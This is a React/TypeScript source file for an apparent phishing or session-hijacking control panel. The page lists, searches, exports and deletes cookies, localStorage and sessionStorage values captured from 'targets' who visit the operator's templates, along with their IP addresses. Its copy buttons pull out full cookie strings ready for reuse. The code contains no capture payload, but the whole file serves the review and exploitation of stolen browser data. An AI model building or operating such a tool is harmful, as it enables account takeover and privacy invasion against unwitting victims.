import { useEffect, useState, useCallback, useRef } from 'react'
import { api, Session, StorageDump } from '../api/client'
import { exportCSV } from '../utils/export'

function parseCookies(raw: string): { name: string; value: string }[] {
  if (!raw) return []
  return raw.split(';').map(p => {
    const eq = p.indexOf('=')
    if (eq === -1) return { name: p.trim(), value: '' }
    return { name: p.slice(0, eq).trim(), value: p.slice(eq + 1).trim() }
  }).filter(c => c.name)
}

function relativeTime(ts: number): string {
  const seconds = Math.floor(Date.now() / 1000 - ts)
  if (seconds < 60) return `${seconds}s ago`
  const minutes = Math.floor(seconds / 60)
  if (minutes < 60) return `${minutes}m ago`
  const hours = Math.floor(minutes / 60)
  if (hours < 24) return `${hours}h ago`
  const days = Math.floor(hours / 24)
  return `${days}d ago`
}

function searchInDump(d: StorageDump, query: string): boolean {
  const q = query.toLowerCase()
  if (d.session_id.toLowerCase().includes(q)) return true
  if (d.ip_address?.toLowerCase().includes(q)) return true
  if (!d.data) return false
  if (typeof d.data.cookies === 'string' && d.data.cookies.toLowerCase().includes(q)) return true
  if (d.data.localStorage) {
    for (const key of Object.keys(d.data.localStorage)) {
      if (key.toLowerCase().includes(q)) return true
      const v = String(d.data.localStorage[key]).toLowerCase()
      if (v.includes(q)) return true
    }
  }
  if (d.data.sessionStorage) {
    for (const key of Object.keys(d.data.sessionStorage)) {
      if (key.toLowerCase().includes(q)) return true
      const v = String(d.data.sessionStorage[key]).toLowerCase()
      if (v.includes(q)) return true
    }
  }
  return false
}

export default function StorageDumps() {
  const [dumps, setDumps] = useState<StorageDump[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [expanded, setExpanded] = useState<Set<string>>(new Set())
  const [rawJson, setRawJson] = useState<Set<string>>(new Set())
  const [search, setSearch] = useState('')
  const [sessions, setSessions] = useState<Session[]>([])
  const [sessionFilter, setSessionFilter] = useState('')
  const offsetRef = useRef(0)
  const [hasMore, setHasMore] = useState(true)
  const [loadingMore, setLoadingMore] = useState(false)
  const [paused, setPaused] = useState(false)
  const LIMIT = 50

  const fetchData = useCallback(async (append = false, useOffset?: number) => {
    const off = useOffset ?? (append ? offsetRef.current : 0)
    try {
      setError(null)
      const result = await api.storage(off, LIMIT, sessionFilter)
      if (append) {
        setDumps(prev => [...prev, ...result.entries])
      } else {
        setDumps(result.entries)
      }
      offsetRef.current = off + (append ? 0 : 0)
      setHasMore(result.has_more)
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Failed to load')
    } finally {
      setLoading(false)
      setLoadingMore(false)
    }
  }, [sessionFilter])

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    offsetRef.current = 0
    setDumps([])
    setLoading(true)
    fetchData(false, 0)
  }, [sessionFilter, fetchData])

  useEffect(() => {
    if (paused) return
    const t = setInterval(() => fetchData(false, 0), 15000)
    return () => clearInterval(t)
  }, [paused, sessionFilter, fetchData])

  const loadMore = () => {
    setLoadingMore(true)
    const nextOffset = offsetRef.current + LIMIT
    offsetRef.current = nextOffset
    fetchData(true, nextOffset)
  }

  const toggleExpand = (id: string) => {
    setExpanded(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id); else next.add(id)
      return next
    })
  }

  const toggleRaw = (id: string) => {
    setRawJson(prev => {
      const next = new Set(prev)
      if (next.has(id)) next.delete(id); else next.add(id)
      return next
    })
  }

  const handleDelete = async (id: string) => {
    try {
      setError(null)
      await api.deleteStorage(id)
      setDumps(prev => prev.filter(d => d.id !== id))
    } catch (e) {
      setError('Failed to delete')
    }
  }

  const handleDeleteAll = async () => {
    if (!confirm('Delete ALL storage dumps?')) return
    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
    try {
      setError(null)
      await api.deleteAllStorage()
      setDumps([])
      setHasMore(false)
    } catch (e) {
      setError('Failed to delete all')
    }
  }

  const filtered = search
    ? dumps.filter(d => searchInDump(d, search))
    : dumps

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  return (
    <div className="space-y-4 stagger">
      {error && (
        <div className="content-card border-0 !border-l-2" style={{ borderLeftColor: 'var(--accent)', backgroundColor: 'color-mix(in srgb, var(--accent) 8%, transparent)' }}>
          <div className="flex items-center justify-between">
            <span className="text-sm" style={{ color: 'var(--accent)' }}>⚠ {error}</span>
            <button onClick={() => setError(null)} className="text-xs text-tertiary hover:text-primary">✕</button>
          </div>
        </div>
      )}

      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Storage & Cookies</h1>
          <p className="text-sm text-tertiary mt-0.5">{filtered.length} of {dumps.length} storage dumps</p>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={() => setPaused(p => !p)} className="select-apple cursor-pointer text-sm">
            {paused ? '▶ Resume' : '⏸ Pause'}
          </button>
          {dumps.length > 0 && (
            <>
              <button onClick={() => exportCSV(filtered.map(d => ({
                session_id: d.session_id,
                ip_address: d.ip_address ?? '',
                cookie_count: d.data?.cookie_count ?? 0,
                localStorage_keys: d.data?.localStorage_keys ?? 0,
                sessionStorage_keys: d.data?.sessionStorage_keys ?? 0,
                date: new Date(d.created_at * 1000).toISOString()
              })), 'storage-dumps.csv')} className="select-apple cursor-pointer">📥 CSV</button>
              <button onClick={() => {
                const blob = new Blob([JSON.stringify(filtered, null, 2)], {type: 'application/json'})
                const url = URL.createObjectURL(blob)
                const a = document.createElement('a'); a.href = url; a.download = 'storage-dumps.json'; a.click()
                URL.revokeObjectURL(url)
              }} className="select-apple cursor-pointer">📥 JSON</button>
              <button onClick={handleDeleteAll} className="select-apple cursor-pointer" style={{ color: 'var(--accent)' }}>🗑 Delete All</button>
            </>
          )}
          <button onClick={() => { setDumps([]); setLoading(true); fetchData(false) }} className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      <div className="flex gap-2">
        <input type="text" placeholder="Search cookies, keys, values, IP, session..."
          value={search} onChange={e => setSearch(e.target.value)} className="input-apple" />
        <select value={sessionFilter} onChange={e => setSessionFilter(e.target.value)} className="select-apple">
          <option value="">All Sessions</option>
          {sessions.map(s => (
            <option key={s.id} value={s.id}>{s.name || s.id.substring(0, 16)}</option>
          ))}
        </select>
      </div>

      {filtered.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">🍪</div>
          <h3>{search ? 'No matches' : 'No storage dumps yet'}</h3>
          <p>{search ? 'Try a different search' : 'Cookie and localStorage data appears when targets visit your templates'}</p>
        </div>
      ) : (
        <div className="space-y-3">
          {filtered.map((d, i) => (
            <div key={d.id} className="content-card !p-0 overflow-hidden animate-fade-in"
              style={{ animationDelay: `${Math.min(i * 0.02, 0.5)}s` }}>
              <div className="flex items-center justify-between p-4 cursor-pointer hover:bg-white/[0.015] transition-colors"
                onClick={() => toggleExpand(d.id)}>
                <div className="flex items-center gap-3 min-w-0">
                  <span className="text-xl select-none shrink-0">🍪</span>
                  <div className="min-w-0">
                    <div className="text-sm font-medium text-primary truncate">
                      Session: <a href={`/?code=${new URLSearchParams(window.location.search).get('code') || ''}#/replay`}
                        onClick={e => e.stopPropagation()} className="mono accent hover:underline"
                        title={d.session_id}>{d.session_id.substring(0, 20)}</a>
                    </div>
                    <div className="text-xs text-tertiary flex items-center gap-2 flex-wrap">
                      <span>{d.data?.cookie_count ?? 0} cookies · {d.data?.localStorage_keys ?? 0} localStorage · {d.data?.sessionStorage_keys ?? 0} sessionStorage</span>
                      {d.ip_address && <><span>·</span><span className="mono">{d.ip_address}</span></>}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-3 shrink-0">
                  {d.data && (
                    <button onClick={e => { e.stopPropagation(); toggleRaw(d.id) }}
                      className="text-xs text-tertiary hover:text-primary transition-colors" title="Toggle raw JSON">
                      {rawJson.has(d.id) ? '📄' : '🔍'}
                    </button>
                  )}
                  <button onClick={e => { e.stopPropagation(); handleDelete(d.id) }}
                    className="text-xs text-tertiary hover:text-red-400 transition-colors">🗑</button>
                  <span className="text-xs text-tertiary whitespace-nowrap" title={new Date(d.created_at * 1000).toLocaleString()}>
                    {relativeTime(d.created_at)}
                  </span>
                  <span className="text-tertiary text-lg select-none">{expanded.has(d.id) ? '▼' : '▶'}</span>
                </div>
              </div>
              {expanded.has(d.id) && (
                <div className="border-t border-subtle p-4 space-y-4 animate-fade-in">
                  {rawJson.has(d.id) && d.data ? (
                    <div>
                      <div className="text-xs font-semibold uppercase mb-2">Raw JSON</div>
                      <pre className="text-xs text-secondary bg-primary p-3 radius-card overflow-x-auto whitespace-pre-wrap break-all mono max-h-96 overflow-y-auto">{JSON.stringify(d.data, null, 2)}</pre>
                      <button onClick={() => navigator.clipboard.writeText(JSON.stringify(d.data, null, 2))}
                        className="mt-2 text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Raw</button>
                    </div>
                  ) : (
                    <>
                      {d.data?.cookies !== undefined && (
                        <div>
                          <div className="text-xs font-semibold uppercase mb-2 flex items-center gap-1.5" style={{ color: '#bf5af2' }}>
                            <span>🍪</span> Cookies <span className="text-tertiary font-normal lowercase">({d.data.cookie_count ?? 0})</span>
                          </div>
                          {typeof d.data.cookies === 'string' && d.data.cookies ? (
                            <div className="space-y-0.5 max-h-64 overflow-y-auto">
                              {parseCookies(d.data.cookies).map((c, ci) => (
                                <div key={ci} className="flex gap-2 text-xs items-start group bg-primary px-2.5 py-1.5 radius-sm border border-subtle/30">
                                  <code className="mono shrink-0 max-w-[40%] truncate" style={{ color: '#bf5af2' }} title={c.name}>{c.name}</code>
                                  <code className="mono text-secondary break-all flex-1 min-w-0 truncate" title={c.value}>{c.value || '—'}</code>
                                  <button onClick={() => navigator.clipboard.writeText(`${c.name}=${c.value}`)}
                                    className="text-tertiary hover:text-primary opacity-0 group-hover:opacity-100 transition-opacity shrink-0 text-[10px]">📋</button>
                                </div>
                              ))}
                            </div>
                          ) : (
                            <pre className="text-xs text-secondary bg-primary p-3 radius-card overflow-x-auto whitespace-pre-wrap break-all mono max-h-48 overflow-y-auto">{typeof d.data.cookies === 'string' ? d.data.cookies : JSON.stringify(d.data.cookies, null, 2)}</pre>
                          )}
                          <button onClick={() => navigator.clipboard.writeText(typeof d.data.cookies === 'string' ? d.data.cookies : JSON.stringify(d.data.cookies, null, 2))}
                            className="mt-2 text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Cookie String</button>
                        </div>
                      )}
                      {d.data?.localStorage && Object.keys(d.data.localStorage).length > 0 && (
                        <div>
                          <div className="text-xs font-semibold uppercase mb-2 flex items-center gap-1.5" style={{ color: '#34c759' }}>
                            <span>💾</span> localStorage
                          </div>
                          <div className="space-y-1 max-h-64 overflow-y-auto">
                            {Object.entries(d.data.localStorage).map(([k, v]: [string, any]) => {
                              const size = d.data.localStorage_sizes?.[k]
                              return (
                                <div key={k} className="flex gap-2 text-xs items-start group">
                                  <code className="mono shrink-0" style={{ color: '#34c759' }}>{k}:</code>
                                  <code className="mono text-secondary break-all flex-1 min-w-0">{String(v)}</code>
                                  {size && <span className="text-tertiary shrink-0 text-[10px]">{size}B</span>}
                                  <button onClick={() => navigator.clipboard.writeText(String(v))}
                                    className="text-tertiary hover:text-primary opacity-0 group-hover:opacity-100 transition-opacity shrink-0 text-[10px]">📋</button>
                                </div>
                              )
                            })}
                          </div>
                        </div>
                      )}
                      {d.data?.sessionStorage && Object.keys(d.data.sessionStorage).length > 0 && (
                        <div>
                          <div className="text-xs font-semibold uppercase mb-2 flex items-center gap-1.5" style={{ color: '#0a84ff' }}>
                            <span>📦</span> sessionStorage
                          </div>
                          <div className="space-y-1 max-h-64 overflow-y-auto">
                            {Object.entries(d.data.sessionStorage).map(([k, v]: [string, any]) => {
                              const size = d.data.sessionStorage_sizes?.[k]
                              return (
                                <div key={k} className="flex gap-2 text-xs items-start group">
                                  <code className="mono shrink-0" style={{ color: '#0a84ff' }}>{k}:</code>
                                  <code className="mono text-secondary break-all flex-1 min-w-0">{String(v)}</code>
                                  {size && <span className="text-tertiary shrink-0 text-[10px]">{size}B</span>}
                                  <button onClick={() => navigator.clipboard.writeText(String(v))}
                                    className="text-tertiary hover:text-primary opacity-0 group-hover:opacity-100 transition-opacity shrink-0 text-[10px]">📋</button>
                                </div>
                              )
                            })}
                          </div>
                        </div>
                      )}
                      {d.data?.window_name && (
                        <div>
                          <div className="text-xs font-semibold uppercase mb-2 flex items-center gap-1.5" style={{ color: '#ff9f0a' }}>
                            <span>🏷</span> window.name
                          </div>
                          <code className="text-xs text-secondary break-all mono">{d.data.window_name}</code>
                        </div>
                      )}
                    </>
                  )}
                </div>
              )}
            </div>
          ))}
          {hasMore && (
            <div className="flex justify-center py-4">
              <button onClick={loadMore} disabled={loadingMore}
                className="px-6 py-2 rounded-lg text-sm transition-colors"
                style={{ backgroundColor: 'var(--bg-tertiary)', color: 'var(--secondary)' }}
                onMouseEnter={e => (e.target as HTMLElement).style.opacity = '0.7'}
                onMouseLeave={e => (e.target as HTMLElement).style.opacity = '1'}>
                {loadingMore ? 'Loading...' : 'Load More'}
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  )
}
